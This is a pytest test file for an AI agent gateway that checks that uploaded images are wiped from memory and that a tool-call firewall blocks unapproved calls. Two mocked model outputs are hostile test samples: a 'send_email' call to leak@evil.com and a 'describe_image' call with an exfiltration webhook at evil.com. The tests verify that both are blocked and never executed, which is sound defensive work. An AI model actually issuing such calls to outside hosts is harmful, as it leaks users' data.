"""Tests for Agent Gateway execution flow, firewall enforcement, and guaranteed memory wiping."""

import io
from typing import Any, Dict, List, Tuple
from unittest.mock import AsyncMock
from fastapi.testclient import TestClient
import pytest
from app.agent_gateway import agent_gateway
from app.db import get_db_connection
from app.main import app
from app.session_manager import session_manager


@pytest.fixture
def client():
    """Fixture providing TestClient with active lifespan context."""
    with TestClient(app) as test_client:
        yield test_client


def create_test_session(client: TestClient) -> Tuple[str, str]:
    """Helper to create an active test session with clean JPEG."""
    jpeg_bytes = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + (b"\x55" * 128) + b"\xff\xd9"
    resp = client.post(
        "/v1/sessions",
        files={"file": ("photo.jpg", io.BytesIO(jpeg_bytes), "image/jpeg")},
        data={"task": "Describe this photo"},
    )
    assert resp.status_code == 201
    data = resp.json()
    return data["session_id"], data["image_sha256"]


def test_run_success_wipes_buffer(client: TestClient) -> None:
    """Proof (a): Buffer is wiped and session removed from RAM upon successful run."""
    session_id, _ = create_test_session(client)
    session = session_manager.get_session(session_id)
    assert session is not None
    assert not session.buffer.is_wiped

    # Mock dispatcher returning clean model output
    async def mock_success(provider: str, task: str, img_bytes: bytes, sid: str) -> Tuple[str, List[Dict[str, Any]]]:
        assert len(img_bytes) > 0
        return "The image shows a sunny landscape.", []

    agent_gateway.mock_dispatcher = mock_success
    try:
        response = client.post(
            f"/v1/sessions/{session_id}/run",
            json={"provider": "gemini"},
        )
        assert response.status_code == 200
        body = response.json()
        assert body["session_id"] == session_id
        assert body["answer"] == "The image shows a sunny landscape."
        assert body["receipt_id"].startswith("rcpt_")

        # Session must be removed from RAM
        assert session_manager.get_session(session_id) is None
        # Buffer must be wiped
        assert session.buffer.is_wiped is True
        assert session.buffer.wipe_verified is True

        # Verify audit events in DB
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM audit_log WHERE session_id = ? ORDER BY id ASC;", (session_id,))
            events = [row["event_type"] for row in cursor.fetchall()]
            assert "run_started" in events
            assert "run_finished" in events
            assert "image_wiped" in events
    finally:
        agent_gateway.mock_dispatcher = None


def test_run_provider_exception_wipes_buffer(client: TestClient) -> None:
    """Proof (b): Buffer is wiped and session removed when provider raises an exception."""
    session_id, _ = create_test_session(client)
    session = session_manager.get_session(session_id)
    assert session is not None

    async def mock_error(provider: str, task: str, img_bytes: bytes, sid: str) -> Tuple[str, List[Dict[str, Any]]]:
        raise RuntimeError("External AI provider timed out or crashed")

    agent_gateway.mock_dispatcher = mock_error
    try:
        with pytest.raises(RuntimeError, match="External AI provider timed out or crashed"):
            client.post(
                f"/v1/sessions/{session_id}/run",
                json={"provider": "openai"},
            )

        # Buffer must still be wiped via finally block
        assert session_manager.get_session(session_id) is None
        assert session.buffer.is_wiped is True
        assert session.buffer.wipe_verified is True

        # Verify audit events
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM audit_log WHERE session_id = ?;", (session_id,))
            events = [row["event_type"] for row in cursor.fetchall()]
            assert "run_started" in events
            assert "image_wiped" in events
    finally:
        agent_gateway.mock_dispatcher = None


def test_run_firewall_blocks_tool_call_wipes_buffer(client: TestClient) -> None:
    """Proof (c): Buffer is wiped and session removed when firewall blocks an unapproved tool call."""
    session_id, _ = create_test_session(client)
    session = session_manager.get_session(session_id)
    assert session is not None

    # Model requests unallowlisted tool "send_email"
    async def mock_unauthorized_tool(provider: str, task: str, img_bytes: bytes, sid: str) -> Tuple[str, List[Dict[str, Any]]]:
        return "I will send an email", [{"name": "send_email", "args": {"to": "leak@evil.com"}}]

    agent_gateway.mock_dispatcher = mock_unauthorized_tool
    try:
        response = client.post(
            f"/v1/sessions/{session_id}/run",
            json={"provider": "gemini"},
        )
        assert response.status_code == 403
        assert "TOOL_NOT_ALLOWED" in response.json()["detail"]

        # Session must be removed and buffer wiped
        assert session_manager.get_session(session_id) is None
        assert session.buffer.is_wiped is True
        assert session.buffer.wipe_verified is True

        # Check audit log
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM audit_log WHERE session_id = ?;", (session_id,))
            events = [row["event_type"] for row in cursor.fetchall()]
            assert "run_started" in events
            assert "firewall_block" in events
            assert "run_blocked" in events
            assert "image_wiped" in events
    finally:
        agent_gateway.mock_dispatcher = None


def test_malicious_tool_call_never_executed(client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    """Proof (d): A malicious tool call targeting https://evil.com is blocked and NEVER executed."""
    session_id, _ = create_test_session(client)
    session = session_manager.get_session(session_id)
    assert session is not None

    # Spy on execute_tool to guarantee it is NEVER called for the malicious invocation
    execute_spy = AsyncMock()
    monkeypatch.setattr(agent_gateway, "execute_tool", execute_spy)

    # Model returns allowed tool 'describe_image' but injects an evil URL argument
    async def mock_malicious_url_tool(provider: str, task: str, img_bytes: bytes, sid: str) -> Tuple[str, List[Dict[str, Any]]]:
        return "Describing", [{"name": "describe_image", "args": {"webhook": "https://evil.com/exfiltrate"}}]

    agent_gateway.mock_dispatcher = mock_malicious_url_tool
    try:
        response = client.post(
            f"/v1/sessions/{session_id}/run",
            json={"provider": "gemini"},
        )
        assert response.status_code == 403
        assert "UNAUTHORIZED_EGRESS_URL" in response.json()["detail"]

        # GUARANTEE: Tool execution was aborted BEFORE invocation
        execute_spy.assert_not_called()

        # Guarantee RAM zeroing
        assert session_manager.get_session(session_id) is None
        assert session.buffer.is_wiped is True
        assert session.buffer.wipe_verified is True
    finally:
        agent_gateway.mock_dispatcher = None


def test_run_session_not_found(client: TestClient) -> None:
    """Verify that accessing a non-existent or expired session returns HTTP 404."""
    response = client.post(
        "/v1/sessions/non_existent_token_123/run",
        json={"provider": "gemini"},
    )
    assert response.status_code == 404
    assert "Session not found" in response.json()["detail"]
